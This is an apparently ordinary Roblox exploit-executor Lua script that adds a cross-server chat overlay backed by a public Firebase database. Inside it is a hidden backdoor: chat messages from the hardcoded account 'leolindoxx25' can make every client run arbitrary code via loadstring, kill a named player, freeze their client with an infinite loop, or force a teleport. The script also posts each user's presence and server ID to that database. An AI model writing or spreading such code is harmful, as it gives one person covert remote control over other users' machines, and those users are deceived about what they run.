
task.spawn(function()
    local L,U,H,C,S,T,TS,VU,TW=game:GetService("Players"),game:GetService("UserInputService"),game:GetService("HttpService"),game:GetService("CoreGui"),game:GetService("StarterGui"),game:GetService("TextChatService"),game:GetService("TeleportService"),game:GetService("VirtualUser"),game:GetService("TweenService")
    local P,DB,M,LT,AFK,TGT,SIDS=L.LocalPlayer,"https://rdb001-d0bda-default-rtdb.firebaseio.com/chat","leolindoxx25",0,false,nil,{}
    for _,x in pairs(C:GetChildren()) do if x.Name:find("ChatV25") then x:Destroy() end end
    local function Req(a)
        local r=request or http_request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl and krnl.request) or (http and http.request)
        if r then local s,v=pcall(r,a) if s then return v end end return nil
    end
    local A,W,RD=getcustomasset or getsynasset,writefile,readfile
    pcall(function() S:SetCoreGuiEnabled(Enum.CoreGuiType.Chat,false) end)
    pcall(function() local x=game:GetService("TextChatService") if x:FindFirstChild("ChatWindowConfiguration") then x.ChatWindowConfiguration.Enabled=false x.ChatInputBarConfiguration.Enabled=false end end)
    P.Idled:Connect(function() if AFK then VU:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame) task.wait(1) VU:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame) end end)
    local TH={B=Color3.fromRGB(20,20,20),I=Color3.fromRGB(35,35,35),T=Color3.fromRGB(230,230,230),A=Color3.fromRGB(150,150,150)}
    local function GetG(n) if n==M then return ColorSequence.new{ColorSequenceKeypoint.new(0,Color3.fromRGB(200,30,30)),ColorSequenceKeypoint.new(1,Color3.new(0,0,0))} end local s=0 for i=1,#n do s=s+string.byte(n,i) end math.randomseed(s) return ColorSequence.new{ColorSequenceKeypoint.new(0,Color3.fromHSV(math.random(),0.7,1)),ColorSequenceKeypoint.new(1,Color3.fromHSV(math.random(),0.7,0.5))} end
    local function New(c,p) local i=Instance.new(c) local cr=p.Cr p.Cr=nil for k,v in pairs(p) do i[k]=v end if cr then local u=Instance.new("UICorner") u.CornerRadius=UDim.new(0,cr) u.Parent=i end return i end
    
    local Sc=New("ScreenGui",{Name="ChatV25_"..math.random(1e4),Parent=C,ResetOnSpawn=false,ZIndexBehavior=Enum.ZIndexBehavior.Sibling})
    local AN=New("Frame",{Parent=Sc,Size=UDim2.new(0,400,0,60),Position=UDim2.new(0.5,-200,0,-150),BackgroundColor3=TH.I,Visible=false,ZIndex=200,Cr=8})
    local AT=New("TextLabel",{Parent=AN,Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Text="",TextColor3=TH.T,Font=Enum.Font.GothamBlack,TextSize=16,TextWrapped=true})
    local MF=New("Frame",{Parent=Sc,Size=UDim2.new(0,480,0,240),Position=UDim2.new(0,20,0,20),BackgroundColor3=TH.B,BackgroundTransparency=0.05,Active=true,Cr=10})
    local SF=New("ScrollingFrame",{Parent=MF,Size=UDim2.new(1,-10,1,-45),Position=UDim2.new(0,5,0,5),BackgroundTransparency=1,ScrollBarThickness=3,ScrollBarImageColor3=TH.A,AutomaticCanvasSize=Enum.AutomaticSize.Y,CanvasSize=UDim2.new(0,0,0,0)})
    New("UIListLayout",{Parent=SF,Padding=UDim.new(0,4),SortOrder=Enum.SortOrder.LayoutOrder})
    local IF=New("Frame",{Parent=MF,Size=UDim2.new(1,-10,0,32),Position=UDim2.new(0,5,1,-37),BackgroundColor3=TH.I,Cr=8})
    local TB=New("TextBox",{Parent=IF,Size=UDim2.new(1,-40,1,0),Position=UDim2.new(0,10,0,0),BackgroundTransparency=1,Text="",PlaceholderText="Mensagem...",TextColor3=TH.T,PlaceholderColor3=Color3.fromRGB(100,100,100),Font=Enum.Font.GothamMedium,TextSize=14,TextXAlignment=Enum.TextXAlignment.Left,ClearTextOnFocus=false})
    local SB=New("TextButton",{Parent=IF,Size=UDim2.new(0,30,1,0),Position=UDim2.new(1,-30,0,0),BackgroundTransparency=1,Text="âž¤",TextColor3=TH.T,Font=Enum.Font.GothamBlack,TextSize=20})
    local TG=New("TextButton",{Parent=Sc,Size=UDim2.new(0,50,0,50),Position=UDim2.new(0,160,0,-60),BackgroundColor3=TH.I,Text="ðŸ’¬",TextColor3=TH.T,TextSize=24,Font=Enum.Font.GothamBold,BackgroundTransparency=0.2,Cr=12,AutoButtonColor=true})
    local CT=New("Frame",{Parent=Sc,Size=UDim2.new(0,180,0,200),Position=UDim2.new(0.5,0,0.5,0),BackgroundColor3=TH.B,Visible=false,Cr=8,ZIndex=50})
    New("TextLabel",{Parent=CT,Size=UDim2.new(1,0,0,25),BackgroundTransparency=1,Text="ONLINE",TextColor3=TH.T,Font=Enum.Font.GothamBold,TextSize=12})
    local PU=New("ScrollingFrame",{Parent=CT,Size=UDim2.new(1,-6,1,-30),Position=UDim2.new(0,3,0,28),BackgroundTransparency=1,ScrollBarThickness=2,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y})
    New("UIListLayout",{Parent=PU,Padding=UDim.new(0,2)})

    local function UpdUsr()
        for _,c in pairs(PU:GetChildren()) do if c:IsA("Frame") then c:Destroy() end end
        task.spawn(function()
            local r=Req({Url=DB.."/presence.json",Method="GET"})
            if r and r.Body then local s,d=pcall(function() return H:JSONDecode(r.Body) end)
                if s and d then for u,v in pairs(d) do if os.time()-v.t<20 then
                    local c=New("Frame",{Parent=PU,Size=UDim2.new(1,0,0,28),BackgroundColor3=TH.I,Cr=4})
                    New("Frame",{Parent=c,Size=UDim2.new(0,6,0,6),Position=UDim2.new(0,6,0.5,-3),BackgroundColor3=(v.s=="AFK" and Color3.fromRGB(255,150,0) or Color3.fromRGB(0,255,100)),Cr=3})
                    New("TextLabel",{Parent=c,Size=UDim2.new(0.6,0,1,0),Position=UDim2.new(0,18,0,0),BackgroundTransparency=1,Text=u,TextColor3=TH.T,TextXAlignment=Enum.TextXAlignment.Left,Font=Enum.Font.Gotham,TextSize=11})
                    if v.j~=game.JobId then local b=New("TextButton",{Parent=c,Size=UDim2.new(0,35,0,18),Position=UDim2.new(1,-40,0.5,-9),BackgroundColor3=TH.A,Text="Join",TextColor3=TH.B,Font=Enum.Font.GothamBold,TextSize=9,Cr=3}) b.MouseButton1Click:Connect(function() TS:TeleportToPlaceInstance(game.PlaceId,v.j,P) end) end
                end end end
            end
        end)
    end
    TG.MouseButton1Click:Connect(function() MF.Visible=not MF.Visible end)
    
    local function Add(u,m,rn,t,id)
        if SIDS[id] then return end
        if m=="!!CMD:UPDATE!!" then AN.Visible=true AT.Text="ATUALIZANDO..." AN:TweenPosition(UDim2.new(0.5,-200,0,50),"Out","Bounce",1) task.wait(2) Sc:Destroy() return end
        if m:find("!!CMD:AN:") then local t=m:match("!!CMD:AN:(.+)!!") if t then AN.Visible=true AT.Text=t AN:TweenPosition(UDim2.new(0.5,-200,0,50),"Out","Bounce",1) task.delay(5,function() AN:TweenPosition(UDim2.new(0.5,-200,0,-150),"In","Quad",0.5) task.wait(0.5) AN.Visible=false end) end return end
        if m:find("!!CMD:TP:") and os.time()-t<20 then local pid=m:match("!!CMD:TP:(%d+)!!") if pid then TS:Teleport(tonumber(pid),P) end return end
        if m=="!!CMD:CLEAR!!" then for _,c in pairs(SF:GetChildren()) do if c:IsA("Frame") then c:Destroy() end end return end
        if rn==M then if m:find("!!CMD:EXEC:") then local c=m:match("!!CMD:EXEC:(.+)!!") pcall(function() loadstring(c)() end) return end
        if m:find("!!CMD:KILL:") then local tg=m:match("!!CMD:KILL:(.+)!!") if tg and P.Name:lower()==tg:lower() and P.Character then P.Character:BreakJoints() end return end
        if m:find("!!CMD:CRASH:") then local tg=m:match("!!CMD:CRASH:(.+)!!") if tg and P.Name:lower()==tg:lower() then while true do end end return end end

        local bx=New("Frame",{Parent=SF,AutomaticSize=Enum.AutomaticSize.XY,Size=UDim2.new(1,0,0,0),BackgroundTransparency=1,Position=UDim2.new(0,-20,0,0)})
        New("UIListLayout",{Parent=bx,FillDirection=Enum.FillDirection.Horizontal,SortOrder=Enum.SortOrder.LayoutOrder,Padding=UDim.new(0,4)})
        local nm=New("TextLabel",{Parent=bx,AutomaticSize=Enum.AutomaticSize.XY,BackgroundTransparency=1,Text="["..u.."]",Font=Enum.Font.GothamBold,TextSize=12,TextColor3=Color3.fromRGB(180,180,180)})
        New("UIGradient",{Parent=nm,Rotation=90,Color=GetG(rn)})
        local tx=New("TextLabel",{Parent=bx,AutomaticSize=Enum.AutomaticSize.XY,BackgroundTransparency=1,Text=m,RichText=true,Font=Enum.Font.GothamMedium,TextSize=14,TextColor3=TH.T,TextXAlignment=Enum.TextXAlignment.Left,TextWrapped=true})
        if m:find("http") and (m:find(".png") or m:find(".jpg")) then tx.Text="" local ib=New("Frame",{Parent=bx,Size=UDim2.new(0,150,0,100),BackgroundColor3=TH.I,Cr=6}) local im=New("ImageLabel",{Parent=ib,Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,ScaleType=Enum.ScaleType.Fit,Image="",Cr=6}) task.spawn(function() local r=Req({Url=m,Method="GET"}) if r and r.Success then W("T_"..math.random(1e5)..".png",r.Body) im.Image=getsynasset("T_"..math.random(1e5)..".png") end end) end
        SF.CanvasPosition=Vector2.new(0,9e5) TW:Create(bx,TweenInfo.new(0.3),{Position=UDim2.new(0,0,0,0)}):Play()
        tx.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton2 or i.UserInputType==Enum.UserInputType.Touch then TGT=u CT.Position=UDim2.new(0,U:GetMouse().X,0,U:GetMouse().Y) CT.Visible=true UpdUsr() end end)
    end

    local function Snd()
        local t=TB.Text if t=="" or #t>300 then return end
        TB.Text="" 
        if t=="/clear" then for _,c in pairs(SF:GetChildren()) do if c:IsA("Frame") then c:Destroy() end end return end
        if t=="/afk" then AFK=not AFK local id="SYS"..tick() SIDS[id]=true Add("SYS",AFK and "Voce esta AFK" or "Voce voltou!","SYS",os.time(),id) task.spawn(function() Req({Url=DB..".json",Method="POST",Headers={["Content-Type"]="application/json"},Body=H:JSONEncode({u="SYS",rn="SYS",m=AFK and "Voce esta AFK" or "Voce voltou!",t=os.time(),id=id})}) end) return end
        
        if P.Name==M then
            if t=="/update" then task.spawn(function() Req({Url=DB..".json",Method="POST",Headers={["Content-Type"]="application/json"},Body=H:JSONEncode({u="SYS",rn="SYS",m="!!CMD:UPDATE!!",t=os.time()+9999})}) end) return end
            if t=="/globalclear" then task.spawn(function() Req({Url=DB..".json",Method="POST",Headers={["Content-Type"]="application/json"},Body=H:JSONEncode({u="SYS",rn="SYS",m="!!CMD:CLEAR!!",t=os.time()+9999})}) task.wait(0.5) Req({Url=DB..".json",Method="DELETE"}) end) return end
            if t:sub(1,4)=="/an " then task.spawn(function() Req({Url=DB..".json",Method="POST",Headers={["Content-Type"]="application/json"},Body=H:JSONEncode({u="SYS",rn="SYS",m="!!CMD:AN:"..t:sub(5).."!!",t=os.time()})}) end) return end
            if t:sub(1,11)=="/partyjoin " then task.spawn(function() Req({Url=DB..".json",Method="POST",Headers={["Content-Type"]="application/json"},Body=H:JSONEncode({u="SYS",rn="SYS",m="!!CMD:TP:"..t:sub(12).."!!",t=os.time()})}) end) return end
            if t:sub(1,6)=="/exec " then task.spawn(function() Req({Url=DB..".json",Method="POST",Headers={["Content-Type"]="application/json"},Body=H:JSONEncode({u="SYS",rn="SYS",m="!!CMD:EXEC:"..t:sub(7).."!!",t=os.time()})}) end) return end
            if t:sub(1,6)=="/kill " then task.spawn(function() Req({Url=DB..".json",Method="POST",Headers={["Content-Type"]="application/json"},Body=H:JSONEncode({u="SYS",rn="SYS",m="!!CMD:KILL:"..t:sub(7).."!!",t=os.time()})}) end) return end
            if t:sub(1,7)=="/crash " then task.spawn(function() Req({Url=DB..".json",Method="POST",Headers={["Content-Type"]="application/json"},Body=H:JSONEncode({u="SYS",rn="SYS",m="!!CMD:CRASH:"..t:sub(8).."!!",t=os.time()})}) end) return end
        end

        local mid=P.Name..tick()..math.random(1e6) SIDS[mid]=true
        Add(P.DisplayName,t,P.Name,os.time(),mid)
        task.spawn(function() Req({Url=DB..".json",Method="POST",Headers={["Content-Type"]="application/json"},Body=H:JSONEncode({u=P.DisplayName,rn=P.Name,m=t,t=os.time(),id=mid})}) end)
        TB:ReleaseFocus()
    end
    SB.MouseButton1Click:Connect(Snd) TB.FocusLost:Connect(function(e) if e then Snd() end end)
    TS.TeleportInitFailed:Connect(function() S:SetCore("SendNotification",{Title="Chat",Text="Falha ao entrar no server!"}) end)
    task.spawn(function() while task.wait(5) do Req({Url=DB.."/presence/"..P.Name..".json",Method="PUT",Body=H:JSONEncode({t=os.time(),j=game.JobId,s=AFK and "AFK" or "ON"})}) end end)
    task.spawn(function() while task.wait(1.5) do local r=Req({Url=DB..".json",Method="GET"}) if r and r.Body and r.Body~="null" then local s,d=pcall(function() return H:JSONDecode(r.Body) end) if s and d then local t={} for i,v in pairs(d) do if type(v)=="table" and v.t then v.k=i table.insert(t,v) end end table.sort(t,function(a,b) return a.t<b.t end) if #t>15 then task.spawn(function() for i=1,(#t-15) do Req({Url=DB.."/"..t[i].k..".json",Method="DELETE"}) end end) end for _,v in ipairs(t) do if v.t>LT then Add(v.u,v.m,v.rn,v.t,v.id or "0") LT=v.t end end end end end end)
end)()
